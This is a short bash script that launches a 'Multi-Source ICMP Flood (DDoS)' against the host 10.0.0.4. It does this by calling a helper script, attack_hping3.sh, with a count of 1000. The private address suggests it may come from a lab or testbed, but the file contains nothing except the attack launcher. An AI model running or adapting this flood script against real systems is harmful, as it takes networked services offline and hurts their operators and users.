#!/bin/bash

TARGET=10.0.0.4

echo "======================================="
echo " Multi-Source ICMP Flood (DDoS)"
echo "======================================="

echo "Starting ICMP Flood..."
./attack_hping3.sh $TARGET 1000
